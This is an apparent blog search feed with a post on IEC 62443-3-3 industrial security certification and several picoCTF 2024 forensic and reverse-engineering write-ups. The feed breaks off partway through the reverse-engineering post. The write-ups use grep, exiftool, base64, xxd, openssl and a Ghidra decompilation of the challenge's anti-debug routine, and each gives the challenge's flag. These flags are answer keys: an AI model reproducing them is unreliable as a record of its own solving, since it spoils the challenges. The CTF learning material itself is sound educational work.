<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>IEC62443-3-3完證心得</title>
      <link href="/%E5%B7%A5%E6%8E%A7%E8%B3%87%E5%AE%89/2024-07-05-IEC62443-3-3%E5%AE%8C%E8%AD%89%E5%BF%83%E5%BE%97/"/>
      <url>/%E5%B7%A5%E6%8E%A7%E8%B3%87%E5%AE%89/2024-07-05-IEC62443-3-3%E5%AE%8C%E8%AD%89%E5%BF%83%E5%BE%97/</url>
      
        <content type="html"><![CDATA[<h1 id="IEC-62443-3-3-完證心得"><a href="#IEC-62443-3-3-完證心得" class="headerlink" title="IEC 62443-3-3 完證心得"></a>IEC 62443-3-3 完證心得</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在現今數位化和智慧製造的趨勢下，工業控制系統（ICS）的資訊安全成為至關重要的議題。IEC 62443 標準作為工業自動化和控制系統（IACS）的國際資安標準，提供了一個框架來確保這些系統能夠抵禦各種威脅，並維持其運作的安全性。本次心得將結合我在 IEC 62443-3-3 認證過程中的經驗以及近期參加的 Moxa 工控資安參訪活動中的學習，進一步探討該標準在智慧工廠中的應用。</p><h2 id="IEC-62443-3-3-簡介"><a href="#IEC-62443-3-3-簡介" class="headerlink" title="IEC 62443-3-3 簡介"></a>IEC 62443-3-3 簡介</h2><p>IEC 62443-3-3 是 IEC 62443 標準系列中的一部分，主要聚焦於 IACS 系統層面的安全要求。該部分定義了七項基本安全需求（SR），包括識別和鑑別控制、使用控制、系統完整性、資料保密性、限制資料流、及時回應事件和資源可用性。這些需求為智慧工廠中的 OT 和 IT 系統建立了明確的安全基準。</p><h2 id="智慧工廠中的應用"><a href="#智慧工廠中的應用" class="headerlink" title="智慧工廠中的應用"></a>智慧工廠中的應用</h2><h3 id="工業4-0實作中心資安場域介紹"><a href="#工業4-0實作中心資安場域介紹" class="headerlink" title="工業4.0實作中心資安場域介紹"></a>工業4.0實作中心資安場域介紹</h3><p>在我參加的 Moxa 工控資安參訪活動中，李維楨教授介紹了臺科大工業4.0實作中心的架構和設施，包括實體存取控制、SCADA 伺服器、CNC 加工中心、防火牆、PLC 和 SIEM 伺服器等多個設備與系統的組成部分。這些設備協同運作，模擬智慧製造環境中可能面臨的資安問題，並展示了如何利用 IEC 62443-3-3 的框架來保護這些系統。</p><h2 id="認證經驗分享"><a href="#認證經驗分享" class="headerlink" title="認證經驗分享"></a>認證經驗分享</h2><p>在 IEC 62443-3-3 認證的實施過程中，我們面臨了多種挑戰，包括漏洞修補、風險評估、以及如何針對具體條文提出有效的解決方案。在 Moxa 參訪中分享了取得 IEC 62443-3-3 認證過程中的實際經驗，例如處理 Moxa Switch 的 DOS 攻擊，並通過 FortiSIEM 平台進行詳細流量分析，證明即使面對攻擊，也能有效地保護系統的完整性。</p><h3 id="認證過程中的挑戰與對策"><a href="#認證過程中的挑戰與對策" class="headerlink" title="認證過程中的挑戰與對策"></a>認證過程中的挑戰與對策</h3><p>評估場域環境：在進行認證前，詳細評估場域內的系統和環境，規劃出適合的認證範圍是至關重要的。<br>精確解讀條文：理解 IEC 62443-3-3 的條文意圖需要深厚的專業知識和團隊合作，這有助於提出具體而有效的解決方案。<br>提供實際證據：必須能夠提供具體證據來證明場域能夠符合條文要求，這包括從實驗結果到系統配置的各種截圖和報告。<br>文件準備與翻譯：認證文件需經過多次審閱和翻譯，確保中文和英文版本均無誤，尤其是專有名詞的正確使用。</p><h2 id="結論"><a href="#結論" class="headerlink" title="結論"></a>結論</h2><p>在智慧製造環境中，資訊安全並非僅依賴單一技術或設備，而是需要整合多方資源，並且透過嚴謹的認證流程來確保系統的整體安全性。IEC 62443-3-3 作為工控資安的國際標準，提供了明確的指導方針，能有效降低智慧工廠面臨的各種風險。透過此次的參訪與認證經驗，我深刻體會到，未來在實施資安措施時，更應注重團隊合作與多層次防護，確保系統的穩定與安全。</p>]]></content>
      
      
      <categories>
          
          <category> 工控資安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OT </tag>
            
            <tag> ICS </tag>
            
            <tag> IEC62443 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>picoCTF 2024 Forensic - Dear Diary</title>
      <link href="/CTF/picoCTF2024/Forensic/Dear%20Diary/Dear%20Diary/"/>
      <url>/CTF/picoCTF2024/Forensic/Dear%20Diary/Dear%20Diary/</url>
      
        <content type="html"><![CDATA[<p>先用autopsy找文件-&gt;找到innocuous<br>再用grep找disk.flag.img中的所有innocuous</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"> /mnt/c/Users/LuYee6813/OneDrive - gapps.ntust.edu.tw/OneDrive/筆記/blog/LuYee6813.github.io/source/_posts/CTF/picoCTF2024/Forensic/Dear Diary/disk.flag.img❯ <span class="token function">grep</span> innocuous <span class="token parameter variable">--text</span> disk.flag.img <span class="token operator">></span> forensic.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>最後用記事本打開來看，把flag拼起來</p><p>flag&#x3D;<code>picoCTF&#123;1_533_n4m35_80d24b30&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> picoCTF2024 </tag>
            
            <tag> forensic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>picoCTF 2024 Forensic - CanYouSee</title>
      <link href="/CTF/picoCTF2024/Forensic/CanYouSee/CanYouSee/"/>
      <url>/CTF/picoCTF2024/Forensic/CanYouSee/CanYouSee/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">~/CTF/picoCTF2024/forensic/CanYouSee                                                                             00:24:44<span class="token operator">></span> <span class="token function">unzip</span> unknown.zipArchive:  unknown.zip  inflating: ukn_reality.jpg ~/CTF/picoCTF2024/forensic/CanYouSee                                                                             00:24:48<span class="token operator">></span> <span class="token function">ls</span>ukn_reality.jpg  unknown.zip ~/CTF/picoCTF2024/forensic/CanYouSee                                                                             00:24:51<span class="token operator">></span> exiftool ukn_reality.jpgExifTool Version Number         <span class="token builtin class-name">:</span> <span class="token number">12.40</span>File Name                       <span class="token builtin class-name">:</span> ukn_reality.jpgDirectory                       <span class="token builtin class-name">:</span> <span class="token builtin class-name">.</span>File Size                       <span class="token builtin class-name">:</span> <span class="token number">2.2</span> MiBFile Modification Date/Time     <span class="token builtin class-name">:</span> <span class="token number">2024</span>:02:16 06:40:14+08:00File Access Date/Time           <span class="token builtin class-name">:</span> <span class="token number">2024</span>:02:16 06:40:14+08:00File Inode Change Date/Time     <span class="token builtin class-name">:</span> <span class="token number">2024</span>:09:04 00:24:48+08:00File Permissions                <span class="token builtin class-name">:</span> -rw-r--r--File Type                       <span class="token builtin class-name">:</span> JPEGFile Type Extension             <span class="token builtin class-name">:</span> jpgMIME Type                       <span class="token builtin class-name">:</span> image/jpegJFIF Version                    <span class="token builtin class-name">:</span> <span class="token number">1.01</span>Resolution Unit                 <span class="token builtin class-name">:</span> inchesX Resolution                    <span class="token builtin class-name">:</span> <span class="token number">72</span>Y Resolution                    <span class="token builtin class-name">:</span> <span class="token number">72</span>XMP Toolkit                     <span class="token builtin class-name">:</span> Image::ExifTool <span class="token number">11.88</span>Attribution URL                 <span class="token builtin class-name">:</span> <span class="token assign-left variable">cGljb0NURntNRTc0RDQ3QV9ISUREM05fZGVjYTA2ZmJ9Cg</span><span class="token operator">==</span>Image Width                     <span class="token builtin class-name">:</span> <span class="token number">4308</span>Image Height                    <span class="token builtin class-name">:</span> <span class="token number">2875</span>Encoding Process                <span class="token builtin class-name">:</span> Baseline DCT, Huffman codingBits Per Sample                 <span class="token builtin class-name">:</span> <span class="token number">8</span>Color Components                <span class="token builtin class-name">:</span> <span class="token number">3</span>Y Cb Cr Sub Sampling            <span class="token builtin class-name">:</span> YCbCr4:2:0 <span class="token punctuation">(</span><span class="token number">2</span> <span class="token number">2</span><span class="token punctuation">)</span>Image Size                      <span class="token builtin class-name">:</span> 4308x2875Megapixels                      <span class="token builtin class-name">:</span> <span class="token number">12.4</span> ~/CTF/picoCTF2024/forensic/CanYouSee                                                                             00:25:01<span class="token operator">></span> base64 <span class="token parameter variable">-d</span> <span class="token string">"cGljb0NURntNRTc0RDQ3QV9ISUREM05fZGVjYTA2ZmJ9Cg=="</span>base64: <span class="token string">'cGljb0NURntNRTc0RDQ3QV9ISUREM05fZGVjYTA2ZmJ9Cg=='</span><span class="token builtin class-name">:</span> No such <span class="token function">file</span> or directory ~/CTF/picoCTF2024/forensic/CanYouSee                                                                             00:25:17<span class="token operator">></span> <span class="token builtin class-name">echo</span> <span class="token string">"cGljb0NURntNRTc0RDQ3QV9ISUREM05fZGVjYTA2ZmJ9Cg=="</span> <span class="token operator">|</span> base64 <span class="token parameter variable">-d</span>picoCTF<span class="token punctuation">&#123;</span>ME74D47A_HIDD3N_deca06fb<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> picoCTF2024 </tag>
            
            <tag> forensic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>picoCTF 2024 Forensic - Mob psycho</title>
      <link href="/CTF/picoCTF2024/Forensic/Mob%20psycho/Mob%20psycho/"/>
      <url>/CTF/picoCTF2024/Forensic/Mob%20psycho/Mob%20psycho/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/mnt/c/U/L/O/O/筆/b/LuYee6813.github.io/so/_/CTF/picoCTF2024/Forensic/Mob psycho <span class="token operator">|</span> main <span class="token operator">&lt;</span><span class="token operator"><span class="token file-descriptor important">1</span>></span><span class="token number">1</span> <span class="token operator">!</span><span class="token number">169</span> ?83            01:44:26<span class="token operator">></span> xxd <span class="token parameter variable">-r</span> <span class="token parameter variable">-p</span> res/color/flag.txtpicoCTF<span class="token punctuation">&#123;</span>ax8mC0RU6ve_NX85l4ax8mCl_a3eb5ac2<span class="token punctuation">&#125;</span>%<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> picoCTF2024 </tag>
            
            <tag> forensic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>picoCTF 2024 Forensic - Verify</title>
      <link href="/CTF/picoCTF2024/Forensic/Verify/Verify/"/>
      <url>/CTF/picoCTF2024/Forensic/Verify/Verify/</url>
      
        <content type="html"><![CDATA[<h1 id="Verify"><a href="#Verify" class="headerlink" title="Verify"></a>Verify</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">~/CTF/picoCTF2024/forensic/Verify/challenge/home/ctf-player/drop-in                                              <span class="token number">23</span>:33:18<span class="token operator">></span> sha256sum files/* <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"467a10447deb3d4e17634cacc2a68ba6c2bb62a6637dad9145ea673bf0be5e02"</span>467a10447deb3d4e17634cacc2a68ba6c2bb62a6637dad9145ea673bf0be5e02  files/c6c8b911<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>使用解密腳本</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">~/CTF/picoCTF2024/forensic/Verify/challenge/home/ctf-player/drop-in                                              <span class="token number">23</span>:40:43<span class="token operator">></span> <span class="token function">sudo</span> ./decrypt.sh files/c6c8b911Error: <span class="token string">'files/c6c8b911'</span> is not a valid file. Look inside the <span class="token string">'files'</span> folder with <span class="token string">'ls -R'</span><span class="token operator">!</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>看一下解密腳本發現是路徑問題</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"> ~/CTF/picoCTF2024/forensic/Verify/challenge/home/ctf-player/drop-in                                              <span class="token number">23</span>:41:54<span class="token operator">></span> <span class="token function">cat</span> decrypt.sh        <span class="token comment">#!/bin/bash</span>        <span class="token comment"># Check if the user provided a file name as an argument</span>        <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$#</span> <span class="token parameter variable">-eq</span> <span class="token number">0</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>            <span class="token builtin class-name">echo</span> <span class="token string">"Expected usage: decrypt.sh &lt;filename>"</span>            <span class="token builtin class-name">exit</span> <span class="token number">1</span>        <span class="token keyword">fi</span>        <span class="token comment"># Store the provided filename in a variable</span>        <span class="token assign-left variable">file_name</span><span class="token operator">=</span><span class="token string">"<span class="token variable">$1</span>"</span>        <span class="token comment"># Check if the provided argument is a file and not a folder</span>        <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token operator">!</span> <span class="token parameter variable">-f</span> <span class="token string">"/home/ctf-player/drop-in/<span class="token variable">$file_name</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>            <span class="token builtin class-name">echo</span> <span class="token string">"Error: '<span class="token variable">$file_name</span>' is not a valid file. Look inside the 'files' folder with 'ls -R'!"</span>            <span class="token builtin class-name">exit</span> <span class="token number">1</span>        <span class="token keyword">fi</span>        <span class="token comment"># If there's an error reading the file, print an error message</span>        <span class="token keyword">if</span> <span class="token operator">!</span> openssl enc <span class="token parameter variable">-d</span> -aes-256-cbc <span class="token parameter variable">-pbkdf2</span> <span class="token parameter variable">-iter</span> <span class="token number">100000</span> <span class="token parameter variable">-salt</span> <span class="token parameter variable">-in</span> <span class="token string">"/home/ctf-player/drop-in/<span class="token variable">$file_name</span>"</span> <span class="token parameter variable">-k</span> picoCTF<span class="token punctuation">;</span> <span class="token keyword">then</span>            <span class="token builtin class-name">echo</span> <span class="token string">"Error: Failed to decrypt '<span class="token variable">$file_name</span>'. This flag is fake! Keep looking!"</span>        <span class="token keyword">fi</span>        %<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>是可以解決路徑問題，但我懶所以偷來用XD 就解出來了</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">openssl enc <span class="token parameter variable">-d</span> -aes-256-cbc <span class="token parameter variable">-pbkdf2</span> <span class="token parameter variable">-iter</span> <span class="token number">100000</span> <span class="token parameter variable">-salt</span> <span class="token parameter variable">-in</span>  files/c6c8b911 <span class="token parameter variable">-k</span> picoCTFpicoCTF<span class="token punctuation">&#123;</span>trust_but_verify_c6c8b911<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>flag: <code>picoCTF&#123;trust_but_verify_c6c8b911&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> picoCTF2024 </tag>
            
            <tag> forensic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>picoCTF 2024 Forensic - endianness-v2</title>
      <link href="/CTF/picoCTF2024/Forensic/endianness-v2/endianness-v2/"/>
      <url>/CTF/picoCTF2024/Forensic/endianness-v2/endianness-v2/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>02:51<span class="token punctuation">]</span>  <span class="token function">zsh</span>  main ↑1 ↓1  ?83 ~50 <span class="token parameter variable">-40</span>                                                                              17ms /mnt/c/Users/LuYee6813/OneDrive - gapps.ntust.edu.tw/OneDrive/筆記/blog/LuYee6813.github.io/source/_posts/CTF/picoCTF2024/Forensic/endianness-v2❯ exiftool challengefileExifTool Version Number         <span class="token builtin class-name">:</span> <span class="token number">12.40</span>File Name                       <span class="token builtin class-name">:</span> challengefileDirectory                       <span class="token builtin class-name">:</span> <span class="token builtin class-name">.</span>File Size                       <span class="token builtin class-name">:</span> <span class="token number">3.3</span> KiBFile Modification Date/Time     <span class="token builtin class-name">:</span> <span class="token number">2024</span>:03:12 08:36:50+08:00File Access Date/Time           <span class="token builtin class-name">:</span> <span class="token number">2024</span>:09:06 02:45:15+08:00File Inode Change Date/Time     <span class="token builtin class-name">:</span> <span class="token number">2024</span>:09:06 02:45:17+08:00File Permissions                <span class="token builtin class-name">:</span> <span class="token parameter variable">-rwxrwxrwx</span>Warning                         <span class="token builtin class-name">:</span> Processing JPEG-like data after unknown <span class="token number">1</span>-byte header<span class="token punctuation">[</span>02:52<span class="token punctuation">]</span>  <span class="token function">zsh</span>  main ↑1 ↓1  ?83 ~50 <span class="token parameter variable">-40</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-hex" data-language="hex"><code class="language-hex">00000000   E0 FF D8 FF  46 4A 10 00  01 00 46 49  01 00 00 01  00 00 01 00  43 00 DB FF  ....FJ....FI........C...00000018   06 06 08 00  08 05 06 07  09 07 07 07  0C 0A 08 09  0B 0C 0D 14  12 19 0C 0B  ........................00000030   1D 14 0F 13  1D 1E 1F 1A  20 1C 1C 1A  20 27 2E 24  1C 23 2C 22  29 37 28 1C  ........ ... &#39;.$.#,&quot;)7(.00000048   34 31 30 2C  27 1F 34 34  32 38 3D 39  34 33 2E 3C  00 DB FF 32  09 09 01 43  410,&#39;.4428&#x3D;943.&lt;...2...C00000060   0C 0B 0C 09  18 0D 0D 18  21 1C 21 32  32 32 32 32  32 32 32 32  32 32 32 32  ........!.!2222222222222<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">reverse_every_four_bytes</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># Split the data into chunks of 4 bytes</span>    chunks <span class="token operator">=</span> <span class="token punctuation">[</span>data<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token comment"># Reverse the order of each chunk</span>    reversed_chunks <span class="token operator">=</span> <span class="token punctuation">[</span>chunk<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">for</span> chunk <span class="token keyword">in</span> chunks<span class="token punctuation">]</span>        <span class="token comment"># Join the reversed chunks back together</span>    reversed_data <span class="token operator">=</span> <span class="token string">b''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>reversed_chunks<span class="token punctuation">)</span>        <span class="token keyword">return</span> reversed_data<span class="token keyword">def</span> <span class="token function">repair_flipped_jpeg</span><span class="token punctuation">(</span>file_path<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># Reverse every 4 bytes in the file</span>    repaired_data <span class="token operator">=</span> reverse_every_four_bytes<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token comment"># Save the repaired data as a new JPEG file</span>    repaired_file_path <span class="token operator">=</span> <span class="token string">'/mnt/data/reversed_repaired_image.jpg'</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>repaired_file_path<span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> repaired_file<span class="token punctuation">:</span>        repaired_file<span class="token punctuation">.</span>write<span class="token punctuation">(</span>repaired_data<span class="token punctuation">)</span>    <span class="token keyword">return</span> repaired_file_pathrepaired_file_path <span class="token operator">=</span> repair_flipped_jpeg<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span>repaired_file_path<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flag&#x3D;<code>picoCTF&#123;cert!f1Ed_iNd!4n_s0rrY_3nDian_6d3ad08e&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> picoCTF2024 </tag>
            
            <tag> forensic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>picoCTF 2024 Forensic - Secret of the Polyglot</title>
      <link href="/CTF/picoCTF2024/Forensic/Secret%20of%20the%20Polyglot/Secret%20of%20the%20Polyglot/"/>
      <url>/CTF/picoCTF2024/Forensic/Secret%20of%20the%20Polyglot/Secret%20of%20the%20Polyglot/</url>
      
        <content type="html"><![CDATA[<p>先把PDF打開後發現一部分flag<br>file 去看發現他是PNG檔案</p><p>所以把他轉成png再打開最後就有完整的flag了</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"> /mnt/c/U/L/O/O/筆/b/LuYee6813.github.io/so/_/C/picoCTF2/F/Secret of the Polyglot <span class="token operator">|</span> main <span class="token operator">&lt;</span><span class="token operator"><span class="token file-descriptor important">1</span>></span><span class="token number">1</span> <span class="token operator">!</span><span class="token number">169</span> ?83            <span class="token number">21</span>:56:59<span class="token operator">></span> <span class="token function">cp</span> flag2of2-final.pdf flag2of2-final.png<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>flag:<code>picoCTF&#123;f1u3n7_1n_pn9_&amp;_pdf_724b1287&#125;</code> </p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> picoCTF2024 </tag>
            
            <tag> forensic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>picoCTF 2024 Forensic - Scan Surprise</title>
      <link href="/CTF/picoCTF2024/Forensic/Scan%20Surprise/Scan%20Surprise/"/>
      <url>/CTF/picoCTF2024/Forensic/Scan%20Surprise/Scan%20Surprise/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"> ~/CTF/picoCTF2024/forensic/Scan Surprise                                                                         05:55:25<span class="token operator">></span> <span class="token function">unzip</span> challenge.zipArchive:  challenge.zip   creating: home/ctf-player/drop-in/ extracting: home/ctf-player/drop-in/flag.png ~/CTF/picoCTF2024/forensic/Scan Surprise                                                                         05:55:29<span class="token operator">></span> <span class="token function">ls</span>challenge.zip  home ~/CTF/picoCTF2024/forensic/Scan Surprise                                                                         05:55:32<span class="token operator">></span> <span class="token builtin class-name">cd</span> home ~/CTF/picoCTF2024/forensic/Scan Surprise/home                                                                    05:55:34<span class="token operator">></span> <span class="token function">ls</span>ctf-player ~/CTF/picoCTF2024/forensic/Scan Surprise/home                                                                    05:55:35<span class="token operator">></span> <span class="token builtin class-name">cd</span> ctf-player ~/CTF/picoCTF2024/forensic/Scan Surprise/home/ctf-player                                                         05:55:36<span class="token operator">></span> <span class="token function">ls</span>drop-in ~/CTF/picoCTF2024/forensic/Scan Surprise/home/ctf-player                                                         05:55:37<span class="token operator">></span> <span class="token builtin class-name">cd</span> drop-in ~/CTF/picoCTF2024/forensic/Scan Surprise/home/ctf-player/drop-in                                                 05:55:40<span class="token operator">></span> <span class="token function">ls</span>flag.png ~/CTF/picoCTF2024/forensic/Scan Surprise/home/ctf-player/drop-in                                                 05:55:40<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接著拿手機掃就得到flag<br>flag:<code>picoCTF&#123;p33k_@_b00_3f7cf1ae&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> picoCTF2024 </tag>
            
            <tag> forensic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>picoCTF 2024 Reverse - WinAntiDbg0x100</title>
      <link href="/CTF/picoCTF2024/Reverse/WinAntiDbg0x100/WinAntiDbg0x100/"/>
      <url>/CTF/picoCTF2024/Reverse/WinAntiDbg0x100/WinAntiDbg0x100/</url>
      
        <content type="html"><![CDATA[<p>先用file看檔案類型</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"> /mnt/c/Users/LuYee6813/OneDrive - gapps.ntust.edu.tw/OneDrive/筆記/blog/LuYee6813.github.io/source/_posts/CTF/picoCTF2024/Reverse/WinAntiDbg0x100/WinAntiDbg0x100❯ <span class="token function">file</span> WinAntiDbg0x100.exeWinAntiDbg0x100.exe: PE32 executable <span class="token punctuation">(</span>console<span class="token punctuation">)</span> Intel <span class="token number">80386</span>, <span class="token keyword">for</span> MS Windows<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>發現是PE32-&gt;所以不用IDA去看-&gt;改用Ghidra</p><p>用Ghidra看function，發現印flag的function在FUN_00401580-&gt;對應到x32dbg的006C1580</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">undefined4 <span class="token function">FUN_00401580</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  uint uVar1<span class="token punctuation">;</span>  <span class="token keyword">int</span> iVar2<span class="token punctuation">;</span>  BOOL BVar3<span class="token punctuation">;</span>  LPWSTR lpOutputString<span class="token punctuation">;</span>  undefined in_stack_fffffff4<span class="token punctuation">;</span>    uVar1 <span class="token operator">=</span> <span class="token function">FUN_00401130</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>uVar1 <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">FUN_00401060</span><span class="token punctuation">(</span><span class="token function">PTR_s________________________</span><span class="token punctuation">(</span>_<span class="token punctuation">)</span>_<span class="token operator">/</span>_____00405020<span class="token punctuation">,</span>in_stack_fffffff4<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">FUN_00401060</span><span class="token punctuation">(</span><span class="token string">"### To start the challenge, you\'ll need to first launch this program using a debu gger!\n"</span>                 <span class="token punctuation">,</span>in_stack_fffffff4<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">OutputDebugStringW</span><span class="token punctuation">(</span>L<span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">OutputDebugStringW</span><span class="token punctuation">(</span>L<span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">FUN_004011b0</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    iVar2 <span class="token operator">=</span> <span class="token function">FUN_00401200</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar2 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">OutputDebugStringW</span><span class="token punctuation">(</span>L<span class="token string">"### Error reading the \'config.bin\' file... Challenge aborted.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      <span class="token function">OutputDebugStringW</span><span class="token punctuation">(</span>                        L<span class="token string">"### Level 1: Why did the clever programmer become a gardener? Because they  discovered their talent for growing a \'patch\' of roses!\n"</span>                        <span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">FUN_00401440</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      BVar3 <span class="token operator">=</span> <span class="token function">IsDebuggerPresent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>BVar3 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">FUN_00401440</span><span class="token punctuation">(</span><span class="token number">0xb</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">FUN_00401530</span><span class="token punctuation">(</span>DAT_00405404<span class="token punctuation">)</span><span class="token punctuation">;</span>        lpOutputString <span class="token operator">=</span> <span class="token 